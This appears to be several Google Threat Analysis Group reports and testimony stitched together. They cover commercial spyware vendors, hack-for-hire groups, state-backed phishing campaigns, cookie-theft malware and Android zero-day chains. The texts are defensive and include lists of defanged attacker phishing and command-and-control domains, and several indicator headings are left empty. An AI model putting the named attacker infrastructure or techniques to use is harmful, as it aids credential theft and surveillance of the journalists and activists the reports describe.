Google was able to identify the vulnerability in use and fix the exploit quickly.
"In December 2021, we released research about novel techniques used by NSO Group to compromise iMessage users."
"iPhone users could be compromised by receiving a malicious iMessage text, without ever needing to click a malicious link."
"Short of not using a device, there is no way to prevent exploitation by a zero-click exploit; it's a weapon against which there is no defense."
"Based on our research and findings, we assessed this to be one of the most technically sophisticated exploits we had ever seen, further demonstrating that the capabilities NSO provides rival those previously thought to be accessible to only a handful of nation states."
"Although this Committee must be concerned with the exploits of NSO Group, it is not the only entity posing risks to our users."
"For example, TAG discovered campaigns targeting Armenian users which utilized zero-day vulnerabilities in Chrome and Internet Explorer."
We assessed that a surveillance vendor packaged and sold these technologies.
"Reporting by CitizenLab linked this activity to Candiru, an Israeli spyware vendor."
"Other reporting from Microsoft has linked this spyware to the compromise of dozens of victims, including political dissidents, human rights activists, journalists, and academics."
"Most recently, we reported in May on five zero-day vulnerabilities affecting Chrome and Android which were used to compromise Android users."
"We assess with high confidence that commercial surveillance company Cytrox packaged these vulnerabilities, and sold the hacking software to at least eight governments."
"Among other targets, this spyware was used to compromise journalists and opposition politicians."
Our reporting is consistent with earlier analysis produced by CitizenLab and Meta.
TAG also recently released information on a segment of attackers we call “hack-for-hire” that focuses on compromising accounts and exfiltrating data as a service.
"In contrast to commercial surveillance vendors, who we generally observe selling a capability for the end user to operate, hack-for-hire firms conduct attacks themselves."
They target a wide range of users and opportunistically take advantage of known security flaws when undertaking their campaigns.
"In June, we provided examples of the hack-for-hire ecosystem from India, Russia, and the United Arab Emirates."
The growth of commercial spyware vendors and hack-for-hire groups has necessitated growth in TAG to counter these threats.
"Where once we only needed substreams to focus on threat actors such as China, Russia, and North Korea, TAG now has a dedicated analysis subteam dedicated to commercial vendors and operators."
Our findings underscore the extent to which commercial surveillance vendors have proliferated capabilities historically only used by governments.
These vendors operate with deep technical expertise to develop and operationalize exploits.
"We believe its use is growing, fueled by demand from governments."
Seven of the nine zero-day vulnerabilities our Threat Analysis Group discovered in 2021 were originally developed by commercial providers and sold to and used by state-sponsored actors.
TAG is actively tracking more than 30 vendors with varying levels of sophistication and public exposure selling exploits or surveillance capabilities to state-sponsored actors.
This industry appears to be thriving.
"These vendors are enabling the proliferation of dangerous hacking tools, arming nation state actors that would not otherwise be able to develop these capabilities in-house."
"While use of surveillance technologies may be legal under national or international laws, they are found to be used by some state actors for purposes antithetical to democratic values: targeting dissidents, journalists, human rights workers, and opposition party politicians."
We have also observed proliferation risk from nation state actors attempting to gain access to the exploits of these vendors.
"Last year, TAG identified an ongoing campaign targeting security researchers working on vulnerability research and development at different companies and organizations."
"In addition to these concerns, there are other reasons why this industry presents a risk more broadly across the Internet."
"While vulnerability research is an important contributor to online safety when that research is used to improve the security of products, vendors stockpiling zero-day vulnerabilities in secret can pose a severe risk to the Internet when the vendor itself gets compromised."
"This has happened to multiple spyware vendors over the past ten years, raising the specter that their stockpiles can be released publicly without warning."
"The proliferation of commercial hacking tools is a threat to national security, making the Internet less safe and undermining the trust on which a vibrant, inclusive digital society depends."
"This is why when Google discovers these activities, we not only take steps to protect users, but also disclose that information publicly to raise awareness and help the entire ecosystem, in line with our historical commitment to openness and democratic values."
"Across all Google products, we incorporate industry-leading security features and protections to keep our users safe."
"On Search, Google’s Safe Browsing is an industry-leading service to identify unsafe websites across the web and notify users and website owners of potential harm."
Google Safe Browsing helps protect over four billion devices every day by showing warnings to users when they attempt to navigate to unsafe sites or download harmful files.
Safe Browsing also notifies webmasters when their websites are compromised by malicious actors and helps them diagnose and resolve the problem so that their visitors stay safer.
"On Gmail, we recommend certain Gmail security precautions to prevent spoofing, phishing, and spam."
Spoofers may send forged messages using an organization’s real name or domain to subvert authentication measures.
"We use email authentication to protect against email spoofing, which is when email content is changed to make the message appear from someone or somewhere other than the actual source."
And we offer other advanced phishing and malware protection to administrators to better protect their users.
"By default, Gmail displays warnings and moves untrustworthy emails to the user’s spam folder."
However administrators can also use advanced security settings to enhance their users’ protection against suspicious attachments and scripts from untrusted senders.
"For Android, through its entire development lifecycle, we subject the products to a rigorous security program."
"The Android security process begins early in the development lifecycle, and each major feature of the platform is reviewed by engineering and security resources."
We ensure appropriate controls are built into the architecture of the system.
"During the development stage, Android-created and open source components are subject to vigorous security reviews"
"For users, Android provides safety and control over how apps and third parties can access the data from their devices."
"For example, users are provided visibility into the permissions requested by each app, and they are able to control those permissions."
We have also built additional tools to prevent successful attacks on devices that run Android once those devices are in users’ hands.
"For example, Google Play Protect, our built-in malware protection for Android, continuously scans devices for potentially harmful applications."
"Although our security precautions are robust, security issues can still occur, which is why we created a comprehensive security response process to respond to incidents."
"Google manages a vulnerability rewards program (VRP), rewarding researchers millions of dollars for their contributions in securing our devices and platforms."
We also provide research grants to security researchers to help fund and support the research community.
"This is all part of a larger strategy to keep Google products and users, as well as the Internet at large more secure."
"Project Zero is also a critical component of this strategy, pushing transparency and more timely patching of vulnerabilities."
"Finally, we also offer the leading tools to protect important civil society actors such as journalists, human rights workers, opposition party politicians, and campaign organizations – in other words, the users who are frequently targeted by surveillance tools."
"Google developed Project Shield, a free protection against distributed denial of service (DDoS) attacks, to protect news media and human rights organization websites."
"To protect high risk user accounts, we offer the Advanced Protection Program (APP), which is our highest form of account security."
"APP has a strong track record protecting users – since the program’s inception, there are no documented cases of an account compromise via phishing."
"We believe it is time for government, industry and civil society to come together to change the incentive structure which has allowed these technologies to spread in secret."
The first step is to understand the scope of the problem.
"We appreciate the Committee’s focus on this issue, and recommend the U.S. Intelligence Community prioritize identifying and analyzing threats from foreign commercial spyware providers as being on par with other major advanced threat actors."
"The U.S. should also consider ways to foster greater transparency in the marketplace, including setting heightened transparency requirements for the domestic surveillance industry."
The U.S. could also set an example to other governments by reviewing and disclosing its own historical use of these tools.
"We welcome recent steps taken by the government in applying sanctions to the NSO Group and Candiru, and we believe other governments should consider expanding these restrictions."
"Additionally, the U.S. government should consider a full ban on Federal procurement of commercial spyware technologies and contemplate imposing further sanctions to limit spyware vendors’ ability to operate in the U.S. and receive U.S. investment."
"The harms from this industry are amply evident by this point, and we believe they outweigh any benefit to continued use."
"Finally, we urge the United States to lead a diplomatic effort to work with the governments of the countries who harbor problematic vendors, as well as those who employ these tools, to build support for measures that limit harms caused by this industry."
Any one government’s ability to meaningfully impact this market is limited; only through a concerted international effort can this serious risk to online safety be mitigated.
Google is investing heavily as a company and as an industry to counter serious threats to our users.
"In the modern world, we must be able to trust the devices we use every day and ensure that foreign adversaries do not have access to sophisticated exploits."
"While we continue to fight these threats on a technical level, the providers of these capabilities operate openly in democratic countries."
Google is committed to leading the industry in detecting and disrupting these threats.
I thank the Committee for this attention on this critical issue.
Google’s Threat Analysis Group (TAG) continues to closely monitor the cybersecurity environment in Eastern Europe with regard to the war in Ukraine.
"Many Russian government cyber assets have remained focused on Ukraine and related issues since the invasion began, while Russian APT activity outside of Ukraine largely remains the same."
"TAG continues to disrupt campaigns from multiple sets of Russian government-backed attackers, some of which are detailed in our previous updates."
"Similarly, Russian observed disinformation efforts are also focused on the war in Ukraine and TAG has disrupted coordinated influence operations from several actors including the Internet Research Agency and a Russian consulting firm as detailed in the TAG Bulletin."
"Here is a deeper look at some campaign activity TAG has observed since our last update: Turla, a group publicly attributed to Russia’s Federal Security Service (FSB), recently hosted Android apps on a domain spoofing the Ukrainian Azov Regiment."
This is the first known instance of Turla distributing Android-related malware.
"The apps were not distributed through the Google Play Store, but hosted on a domain controlled by the actor and disseminated via links on third party messaging services."
We believe there was no major impact on Android users and that the number of installs was miniscule.
The app is distributed under the guise of performing Denial of Service (DoS) attacks against a set of Russian websites.
"However, the 'DoS' consists only of a single GET request to the target website, not enough to be effective."
The list of target websites for the app can be seen in the CyberChef recipe here.
"During our investigation into the Turla CyberAzov apps, we identified another Android app first seen in the wild in March 2022 that also claimed to conduct DoS attacks against Russian websites."
"In this case, the Android app name was stopwar.apk (com.ddos.stopwar) and was distributed from the website stopwar.pro."
This app is quite different from the Turla apps described above and written by a different developer.
"It also downloads a list of targets from an external site, but unlike the Turla apps, it continually sends requests to the target websites until it is stopped by the user."
"Based on our analysis, we believe that the StopWar app was developed by pro-Ukrainian developers and was the inspiration for what Turla actors based their fake CyberAzov DoS app off of."
"Indicators: The Follina vulnerability (CVE-2022-30190), first disclosed in late May, received significant usage from both APT and cybercrime groups throughout June after it was patched by Microsoft."
Follina is a remote code execution (RCE) vulnerability in the Microsoft Windows Support Diagnostic Tool (MSDT).
"Consistent with CERT-UA reporting, TAG observed multiple Russian GRU actors - APT28 and Sandworm - conduct campaigns exploiting the Follina vulnerability."
"The Sandworm campaign used compromised government accounts to send links to Microsoft Office documents hosted on compromised domains, primarily targeting media organizations in Ukraine."
TAG has also observed an increasing number of financially motivated actors targeting Ukraine.
"One recent campaign from a group tracked by CERT-UA as UAC-0098 delivered malicious documents with the Follina exploit in password-protected archives, impersonating the State Tax Service of Ukraine."
"We assess this actor is a former initial ransomware access broker who previously worked with the Conti ransomware group distributing the IcedID banking trojan based on overlaps in infrastructure, tools used in previous campaigns, and a unique cryptor."
"Ghostwriter/UNC1151, a threat actor attributed to Belarus, has remained active targeting accounts of webmail and social media networks of Polish users."
They continue to use the 'Browser in the Browser' phishing technique that TAG first observed and described in March.
"An example of this technique, used to target Facebook users, can be seen in the screenshot below."
"COLDRIVER, a Russian-based threat actor sometimes referred to as Callisto, continues to send credential phishing emails to targets including government and defense officials, politicians, NGOs and think tanks, and journalists."
"In addition to including phishing links directly in the email, the attackers also link to PDFs and/or DOCs, hosted on Google Drive and Microsoft One Drive, that contain a link to an attacker-controlled phishing domain."
These phishing domains have been blocked through Google Safe Browsing – a service that identifies unsafe websites across the web and notifies users and website owners of potential harm.
Recently observed COLDRIVER indicators: In another campaign tracked by CERT-UA as UAC-0056 we observed compromised email addresses of a Regional Prosecutor’s office of Ukraine leveraged to send malicious Microsoft Excel documents with VBA macros delivering Cobalt Strike.
"In just two days, the volume observed and categorized as spam by Gmail exceeded 4,500 emails."
"As part of TAG's mission to counter serious threats to Google and our users, we've published analysis on a range of persistent threats including government-backed attackers, commercial surveillance vendors, and serious criminal operators."
"Today, we're sharing intelligence on a segment of attackers we call hack-for-hire, whose niche focuses on compromising accounts and exfiltrating data as a service."
"In contrast to commercial surveillance vendors, who we generally observe selling a capability for the end user to operate, hack-for-hire firms conduct attacks themselves."
They target a wide range of users and opportunistically take advantage of known security flaws when undertaking their campaigns.
"Both, however, enable attacks by those who would otherwise lack the capabilities to do so."
"We have seen hack-for-hire groups target human rights and political activists, journalists, and other high-risk users around the world, putting their privacy, safety and security at risk."
"They also conduct corporate espionage, handily obscuring their clients’ role."
"To help users and defenders, we will provide examples of the hack-for-hire ecosystem from India, Russia, and the United Arab Emirates and context around their capabilities and persistence mechanisms."
"The hack-for-hire landscape is fluid, both in how the attackers organize themselves and in the wide range of targets they pursue in a single campaign at the behest of disparate clients."
"Some hack-for-hire attackers openly advertise their products and services to anyone willing to pay, while others operate more discreetly selling to a limited audience."
"For example, TAG has observed Indian hack-for-hire firms work with third party private investigative services — intermediaries that reach out for services when a client requires them — and provide data exfiltrated from a successful operation."
This is detailed in depth in today’s Reuters investigation into the Indian hack-for-hire ecosystem.
We have also observed Indian hack-for-hire firms work with freelance actors not directly employed by the firms themselves.
"The breadth of targets in hack-for-hire campaigns stands in contrast to many government-backed operations, which often have a clearer delineation of mission and targets."
"A recent campaign from an Indian hack-for-hire operator was observed targeting an IT company in Cyprus, an education institution in Nigeria, a fintech company in the Balkans and a shopping company in Israel."
"Since 2012, TAG has been tracking an interwoven set of Indian hack-for-hire actors, with many having previously worked for Indian offensive security providers Appin and Belltrox."
"One cluster of this activity frequently targets government, healthcare, and telecom sectors in Saudi Arabia, the United Arab Emirates, and Bahrain with credential phishing campaigns."
These credential phishing campaigns have ranged from targeting specific government organizations to AWS accounts to Gmail accounts.
"TAG has linked former employees of both Appin and Belltrox to Rebsec, a new firm that openly advertises corporate espionage as an offering on its company website."
"While investigating a 2017 credential phishing campaign that targeted a prominent Russian anti-corruption journalist, we discovered the Russian attacker targeting other journalists, politicians across Europe, and various NGOs and non-profit organizations."
This hack-for-hire actor has been publicly referred to as 'Void Balaur'.
"These campaigns were similar regardless of target, consisting of a credential phishing email with a link to an attacker-controlled phishing page."
The lures ranged from fake Gmail and other webmail provider notifications to messages spoofing Russian government organizations.
"After the target account was compromised, the attacker generally maintained persistence by granting an OAuth token to a legitimate email application like Thunderbird or generating an App Password to access the account via IMAP."
Both OAuth tokens and App Passwords are revoked when a user changes their password.
"During our early investigation, TAG discovered the attacker’s public website (no longer available) advertising account hacking capabilities for email and social media services."
The site claimed to have received positive reviews on Russian underground forums such as Dublikat and Probiv.cc.
"Over the past five years, TAG has observed the group targeting accounts at major webmail providers like Gmail, Hotmail, and Yahoo! and regional webmail providers like abv.bg, mail.ru, inbox.lv, and UKR.net."
United Arab Emirates TAG is also tracking a hack-for-hire group now based in the United Arab Emirates that is mostly active in the Middle East and North Africa.
"They have primarily targeted government, education, and political organizations including Middle East focused NGOs in Europe and the Palestinian political party Fatah."
Amnesty International has also reported on their campaigns.
"The group commonly uses Google or OWA password reset lures to steal credentials from targets, often using the MailJet or SendGrid API to send phishing emails."
"Unlike many hack-for-hire actors that use open source phishing frameworks like Evilginx or GoPhish, this group uses a custom phishing kit that utilizes Selenium, a self described 'suite of tools for automating web browsers.'"
"Previously described by Amnesty, this phishing kit has remained under active development over the past five years."
"After compromising an account, the actor maintains persistence by granting themselves an OAuth token to a legitimate email app like Thunderbird, or by linking the victim Gmail account to an attacker-owned account on a third-party mail provider."
The attacker would then use a custom tool to download the mailbox contents via IMAP.
"This group also has links to the original developers of H-Worm, also known as njRAT."
"In 2014, Microsoft filed a civil suit against the developer, Mohammed Benabdellah, for the development and dissemination of H-Worm."
"Benabdellah, who also goes by the moniker Houdini, has been actively involved in the day-to-day development and operational deployment of the credential phishing capabilities used by this group since its inception."
"As part of our efforts to combat serious threat actors, we use results of our research to improve the safety and security of our products."
"Upon discovery, all identified websites and domains were added to Safe Browsing to protect users from further harm."
We encourage any high risk user to enable Advanced Protection and Google Account Level Enhanced Safe Browsing and ensure that all devices are updated.
"Additionally, our CyberCrime Investigation Group is sharing relevant details and indicators with law enforcement."
"TAG is committed to sharing our findings as a way of raising awareness with the security community, and with companies and individuals that might have been targeted."
We hope that improved understanding of the tactics and techniques will enhance threat hunting capability and lead to stronger user protections across the industry.
With contributions from Winnona DeSombre UAE hack-for-hire Group Domains: Indian hack-for-hire Group Domains: Russian hack-for-hire Group Domains:
"Google’s Threat Analysis Group tracks actors involved in disinformation campaigns, government backed hacking, and financially motivated abuse."
"Since late 2019, our team has disrupted financially motivated phishing campaigns targeting YouTubers with Cookie Theft malware."
"The actors behind this campaign, which we attribute to a group of hackers recruited in a Russian-speaking forum, lure their target with fake collaboration opportunities (typically a demo for anti-virus software, VPN, music players, photo editing or online games), hijack their channel, then either sell it to the highest bidder or use it to broadcast cryptocurrency scams."
"In collaboration with YouTube, Gmail, Trust & Safety, CyberCrime Investigation Group and Safe Browsing teams, our protections have decreased the volume of related phishing emails on Gmail by 99.6% since May 2021."
"We blocked 1.6M messages to targets, displayed ~62K Safe Browsing phishing page warnings, blocked 2.4K files, and successfully restored ~4K accounts."
"With increased detection efforts, we’ve observed attackers shifting away from Gmail to other email providers (mostly email.cz, seznam.cz, post.cz and aol.com)."
"Moreover, to protect our users, we have referred the below activity to the FBI for further investigation."
"In this blog, we share examples of the specific tactics, techniques and procedures (TTPs) used to lure victims, as well as some guidance on how users can further protect themselves."
"Cookie Theft, also known as “pass-the-cookie attack,” is a session hijacking technique that enables access to user accounts with session cookies stored in the browser."
"While the technique has been around for decades, its resurgence as a top security risk could be due to a wider adoption of multi-factor authentication (MFA) making it difficult to conduct abuse, and shifting attacker focus to social engineering tactics."
Many YouTube creators provide an email address on their channel for business opportunities.
"In this case, the attackers sent forged business emails impersonating an existing company requesting a video advertisement collaboration."
The phishing typically started with a customized email introducing the company and its products.
"Once the target agreed to the deal, a malware landing page disguised as a software download URL was sent via email or a PDF on Google Drive, and in a few cases, Google documents containing the phishing links."
"Around 15,000 actor accounts were identified, most of which were created for this campaign specifically."
The attackers registered various domains associated with forged companies and built multiple websites for malware delivery.
"To date, we’ve identified at least 1,011 domains created solely for this purpose."
"Some of the websites impersonated legitimate software sites, such as Luminar, Cisco VPN, games on Steam, and some were generated using online templates."
"During the pandemic, we also uncovered attackers posing as news providers with a “Covid19 news software.”"
"In one case, we observed a fake social media page copying content from an existing software company."
The following screenshot is an example of a fake page where the original URL is replaced with one leading to a cookie theft malware download.
"Because Google actively detects and disrupts phishing links sent via Gmail, the actors were observed driving targets to messaging apps like WhatsApp, Telegram or Discord."
"Once the target runs the fake software, a cookie stealing malware executes, taking browser cookies from the victim’s machine and uploading them to the actor's command & control servers."
"Although this type of malware can be configured to be persistent on the victim's machine, these actors are running all malware in non-persistent mode as a smash-and-grab technique."
"This is because if the malicious file is not detected when executed, there are less artifacts on an infected host and therefore security products fail to notify the user of a past compromise."
"We have observed that actors use various types of malware based on personal preference, most of which are easily available on Github."
"Some commodity malware used included RedLine, Vidar, Predator The Thief, Nexus stealer, Azorult, Raccoon, Grand Stealer, Vikro Stealer, Masad (Google’s naming), and Kantal (Google’s naming) which shares code similarity with Vidar."
Open source malware like Sorano and AdamantiumThief were also observed.
"Related hashes are listed in the Technical Details section, at the end of this report."
Most of the observed malware was capable of stealing both user passwords and cookies.
"Some of the samples employed several anti-sandboxing techniques including enlarged files, encrypted archive and download IP cloaking."
A few were observed displaying a fake error message requiring user click-through to continue execution.
A large number of hijacked channels were rebranded for cryptocurrency scam live-streaming.
"The channel name, profile picture and content were all replaced with cryptocurrency branding to impersonate large tech or cryptocurrency exchange firms."
The attacker live-streamed videos promising cryptocurrency giveaways in exchange for an initial contribution.
"On account-trading markets, hijacked channels ranged from $3 USD to $4,000 USD depending on the number of subscribers."
"These campaigns were carried out by a number of hack-for-hire actors recruited on Russian-speaking forums via the following job description, offering two types of work: This recruitment model explains the highly customized social engineering, as well as the varied malware types given each actor's choice of preferred malware."
We are continuously improving our detection methods and investing in new tools and features that automatically identify and stop threats like this one.
Some of these improvements include: It is also important that users remain aware of these types of threats and take appropriate action to further protect themselves.
Our recommendations: Additional resources: Avoid & Report Phishing Emails.
Related Malware hashes: Top Phishing Domains:
"Google’s Threat Analysis Group tracks actors involved in disinformation campaigns, government backed hacking, and financially motivated abuse."
We have a long-standing policy to send you a warning if we detect that your account is a target of government-backed phishing or malware attempts.
"So far in 2021, we’ve sent over 50,000 warnings, a nearly 33% increase from this time in 2020."
This spike is largely due to blocking an unusually large campaign from a Russian actor known as APT28 or Fancy Bear.
"We intentionally send these warnings in batches to all users who may be at risk, rather than at the moment we detect the threat itself, so that attackers cannot track our defense strategies."
"On any given day, TAG is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries."
This means that there is typically more than one threat actor behind the warnings.
"In this blog, we explore some of the most notable campaigns we’ve disrupted this year from a different government-backed attacker: APT35, an Iranian group, which regularly conducts phishing campaigns targeting high risk users."
This is the one of the groups we disrupted during the 2020 US election cycle for its targeting of campaign staffers.
"For years, this group has hijacked accounts, deployed malware, and used novel techniques to conduct espionage aligned with the interests of the Iranian government."
"In early 2021, APT35 compromised a website affiliated with a UK university to host a phishing kit."
"Attackers sent email messages with links to this website to harvest credentials for platforms such as Gmail, Hotmail, and Yahoo."
Users were instructed to activate an invitation to a (fake) webinar by logging in.
The phishing kit will also ask for second-factor authentication codes sent to devices.
"APT35 has relied on this technique since 2017 — targeting high-value accounts in government, academia, journalism, NGOs, foreign policy, and national security."
Credential phishing through a compromised website demonstrates these attackers will go to great lengths to appear legitimate – as they know it's difficult for users to detect this kind of attack.
"In May 2020, we discovered that APT35 attempted to upload spyware to the Google Play Store."
"The app was disguised as VPN software that, if installed, could steal sensitive information such as call logs, text messages, contacts, and location data from devices."
Google detected the app quickly and removed it from the Play Store before any users had a chance to install it.
"Although Play Store users were protected, we are highlighting the app here as TAG has seen APT35 attempt to distribute this spyware on other platforms as recently as July 2021."
One of the most notable characteristics of APT35 is their impersonation of conference officials to conduct phishing attacks.
Attackers used the Munich Security and the Think-20 (T20) Italy conferences as lures in non-malicious first contact email messages to get users to respond.
"When they did, attackers sent them phishing links in follow-on correspondence."
Targets typically had to navigate through at least one redirect before landing on a phishing domain.
"Link shorteners and click trackers are heavily used for this purpose, and are oftentimes embedded within PDF files."
"We’ve disrupted attacks using Google Drive, App Scripts, and Sites pages in these campaigns as APT35 tries to get around our defenses."
Services from Dropbox and Microsoft are also abused.
One of APT35’s novel techniques involves using Telegram for operator notifications.
The attackers embed javascript into phishing pages that notify them when the page has been loaded.
"To send the notification, they use the Telegram API sendMessage function, which lets anyone use a Telegram bot to send a message to a public channel."
"The attackers use this function to relay device-based data to the channel, so they can see details such as the IP, useragent, and locales of visitors to their phishing sites in real-time."
We reported the bot to Telegram and they have taken action to remove it.
We warn users when we suspect a government-backed threat like APT35 is targeting them.
"Thousands of these warnings are sent every month, even in cases where the corresponding attack is blocked."
"If you receive a warning it does not mean your account has been compromised, it means you have been identified as a target."
Workspace administrators are also notified regarding targeted accounts in their domain.
Users are encouraged to take these warnings seriously and consider enrolling in the Advanced Protection Program or enabling two-factor authentication if they haven't already.
We also block malicious domains using Google Safe Browsing – a service that Google's security team built to identify unsafe websites across the web and notify users and website owners of potential harm.
"When a user of a Safe Browsing-enabled browser or app attempts to access unsafe content on the web, they’ll see a warning page explaining that the content they’re trying to access may be harmful."
"When a site identified by Safe Browsing as harmful appears in Google Search results, we show a warning next to it in the results."
"Threat Analysis Group will continue to identify bad actors and share relevant information with others in the industry, with the goal of bringing awareness to these issues, protecting you and fighting bad actors to prevent future attacks."
Indicators from APT28 phishing campaign: service-reset-password-moderate-digital.rf[.]gd reset-service-identity-mail.42web[.]io digital-email-software.great-site[.]net Indicators from APT35 campaigns: Abused Google Properties: https://sites.google[.]com/view/ty85yt8tg8-download-rtih4ithr/ https://sites.google[.]com/view/user-id-568245/ https://sites.google[.]com/view/hhbejfdwdhwuhscbsb-xscvhdvbc/ Abused Dropbox Properties: https://www.dropbox[.]com/s/68y4vpfu8pc3imf/Iraq&Jewish.pdf Phishing Domains: nco2[.]live summit-files[.]com filetransfer[.]club continuetogo[.]me accessverification[.]online customers-verification-identifier[.]site service-activity-session[.]online identifier-service-review[.]site recovery-activity-identification[.]site review-session-confirmation[.]site recovery-service-activity[.]site verify-service-activity[.]site service-manager-notifications[.]info
Android App: https://www.virustotal.com/gui/file/5d3ff202f20af915863eee45916412a271bae1ea3a0e20988309c16723ce4da5/detection Android App C2: communication-shield[.]site cdsa[.]xyz
"To protect our users, Google’s Threat Analysis Group (TAG) routinely hunts for 0-day vulnerabilities exploited in-the-wild."
"In 2021, we reported nine 0-days affecting Chrome, Android, Apple and Microsoft, leading to patches to protect users from these attacks."
"This blog is a follow up to our July 2021 post on four 0-day vulnerabilities we discovered in 2021, and details campaigns targeting Android users with five distinct 0-day vulnerabilities: We assess with high confidence that these exploits were packaged by a single commercial surveillance company, Cytrox, and sold to different government-backed actors who used them in at least the three campaigns discussed below."
"Consistent with findings from CitizenLab, we assess likely government-backed actors purchasing these exploits are operating (at least) in Egypt, Armenia, Greece, Madagascar, Côte d’Ivoire, Serbia, Spain and Indonesia."
The 0-day exploits were used alongside n-day exploits as the developers took advantage of the time difference between when some critical bugs were patched but not flagged as security issues and when these patches were fully deployed across the Android ecosystem.
Our findings underscore the extent to which commercial surveillance vendors have proliferated capabilities historically only used by governments with the technical expertise to develop and operationalize exploits.
Seven of the nine 0-days TAG discovered in 2021 fall into this category: developed by commercial providers and sold to and used by government-backed actors.
TAG is actively tracking more than 30 vendors with varying levels of sophistication and public exposure selling exploits or surveillance capabilities to government-backed actors.
All three campaigns delivered one-time links mimicking URL shortener services to the targeted Android users via email.
"The campaigns were limited — in each case, we assess the number of targets was in the tens of users."
"Once clicked, the link redirected the target to an attacker-owned domain that delivered the exploits before redirecting the browser to a legitimate website."
"If the link was not active, the user was redirected directly to a legitimate website."
"We've seen this technique used against journalists and other unidentified targets, and alerted those users when possible."
"We assess that these campaigns delivered ALIEN, a simple Android malware in charge of loading PREDATOR, an Android implant described by CitizenLab in December 2021."
ALIEN lives inside multiple privileged processes and receives commands from PREDATOR over IPC.
"These commands include recording audio, adding CA certificates, and hiding apps."
"The first campaign, detected in August 2021, used Chrome on a Samsung Galaxy S21 and the web server immediately replied with a HTTP redirect (302) pointing to the following intent URL."
This URL abused a logic flaw and forced Chrome to load another URL in the Samsung Browser without user interaction or warnings.
"We did not capture the subsequent stages, but assess the attackers did not have exploits for the current version of Chrome (91.0.4472) at that time, but instead used n-day exploits targeting Samsung Browser, which was running an older and vulnerable version of Chromium."
We assess with high confidence this vulnerability was sold by an exploit broker and probably abused by more than one surveillance vendor.
More technical details about this vulnerability are available in this RCA by Maddie Stone.
Related IOCs
"In September 2021, TAG detected a campaign where the exploit chain was delivered to a fully up-to-date Samsung Galaxy S10 running the latest version of Chrome."
"We recovered the exploit used to escape the Chrome Sandbox, but not the initial RCE exploit."
The sandbox escape was loaded directly as an ELF binary embedding libchrome.so and a custom libmojo_bridge.so was used to ease the communication with the Mojo IPCs.
This means the renderer exploit did not enable MojoJS bindings like we often see in public exploits.
"Analysis of the exploit identified two different vulnerabilities in Chrome: After escaping the sandbox, the exploit downloaded another exploit in /data/data/com.android.chrome/p.so to elevate privileges and install the implant."
We haven’t retrieved a copy of the exploit.
Related IOCs
"In October 2021, we detected a full chain exploit from an up-to-date Samsung phone running the latest version of Chrome."
"The chain included two 0-day exploits: Of note, CVE-2021-1048 was fixed in the Linux kernel in September 2020, over a year before this campaign."
The commit was not flagged as a security issue and therefore the patch was not backported in most Android kernels.
"At the time of the exploit, all Samsung kernels were vulnerable; LTS kernels running on Pixel phones were recent enough and included the fix for this bug."
"Unfortunately, this is not the first time we have seen this happen with exploits in the wild; the 2019 Bad Binder vulnerability is another example."
"In both cases, the fix was not flagged as a security issue and thus not backported to all (or any) Android kernels."
Attackers are actively looking for and profiting from such slowly-fixed vulnerabilities.
Related IOCs
We’d be remiss if we did not acknowledge the quick response and patching of these vulnerabilities by Google’s Chrome and Android teams.
We would also like to thank Project Zero for their technical assistance in helping analyze these bugs.
TAG continues to track more than 30 vendors with varying levels of sophistication and public exposure selling exploits or surveillance capabilities to government-backed actors.
We remain committed to updating the community as we uncover these campaigns.
"Tackling the harmful practices of the commercial surveillance industry will require a robust, comprehensive approach that includes cooperation among threat intelligence teams, network defenders, academic researchers and technology platforms."
We look forward to continuing our work in this space and advancing the safety and security of our users around the world.
"NOTE: On May 20th, we updated our attribution to more precisely describe our findings."
Google’s Threat Analysis Group (TAG) has been closely monitoring the cybersecurity activity in Eastern Europe with regard to the war in Ukraine.
"Since our last update, TAG has observed a continuously growing number of threat actors using the war as a lure in phishing and malware campaigns."
"Similar to other reports, we have also observed threat actors increasingly target critical infrastructure entities including oil and gas, telecommunications and manufacturing."
Financially motivated and criminal actors are also using current events as a means for targeting users.
"As always, we continue to publish details surrounding the actions we take against coordinated influence operations in our quarterly TAG bulletin."
We promptly identify and remove any such content but have not observed any significant shifts from the normal levels of activity that occur in the region.
"Here is a deeper look at the campaign activity TAG has observed and the actions the team has taken to protect our users over the past few weeks: APT28 or Fancy Bear, a threat actor attributed to Russia GRU, was observed targeting users in Ukraine with a new variant of malware."
"The malware, distributed via email attachments inside of password protected zip files (ua_report.zip), is a .Net executable that when executed steals cookies and saved passwords from Chrome, Edge and Firefox browsers."
The data is then exfiltrated via email to a compromised email account.
Malware samples:
TAG would like to thank the Yahoo! Paranoids Advanced Cyber Threats Team for their collaboration in this investigation.
"Turla, a group TAG attributes to Russia FSB, continues to run campaigns against the Baltics, targeting defense and cybersecurity organizations in the region."
"Similar to recently observed activity, these campaigns were sent via email and contained a unique link per target that led to a DOCX file hosted on attacker controlled infrastructure."
"When opened, the DOCX file would attempt to download a unique PNG file from the same attacker controlled domain."
"Recently observed Turla domains: COLDRIVER, a Russian-based threat actor sometimes referred to as Callisto, continues to use Gmail accounts to send credential phishing emails to a variety of Google and non-Google accounts."
"The targets include government and defense officials, politicians, NGOs and think tanks, and journalists."
"The group's tactics, techniques and procedures (TTPs) for these campaigns have shifted slightly from including phishing links directly in the email, to also linking to PDFs and/or DOCs hosted on Google Drive and Microsoft One Drive."
Within these files is a link to an attacker controlled phishing domain.
These phishing domains have been blocked through Google Safe Browsing – a service that identifies unsafe websites across the web and notifies users and website owners of potential harm.
"Recently observed COLDRIVER credential phishing domains: Ghostwriter, a Belarusian threat actor, has remained active during the course of the war and recently resumed targeting of Gmail accounts via credential phishing."
"If the user clicked continue, they would be redirected to an attacker controlled site that collected the users credentials."
There were no accounts compromised from this campaign and Google will alert all targeted users of these attempts through our monthly government-backed attacker warnings.
Both pages from this campaign are shown below.
"In mid-April, TAG detected a Ghostwriter credential phishing campaign targeting Facebook users."
"The targets, primarily located in Lithuania, were sent links to attacker controlled domains from a domain spoofing the Facebook security team."
"Recently observed Ghostwriter credential phishing domains and emails: Curious Gorge, a group TAG attributes to China's PLA SSF, has remained active against government, military, logistics and manufacturing organizations in Ukraine, Russia and Central Asia."
"In Russia, long running campaigns against multiple government organizations have continued, including the Ministry of Foreign Affairs."
"Over the past week, TAG identified additional compromises impacting multiple Russian defense contractors and manufacturers and a Russian logistics company."
"Upon discovery, all identified websites and domains were added to Safe Browsing to protect users from further exploitation."
We also send all targeted Gmail and Workspace users government-backed attacker alerts notifying them of the activity.
We encourage any potential targets to enable Google Account Level Enhanced Safe Browsing and ensure that all devices are updated.
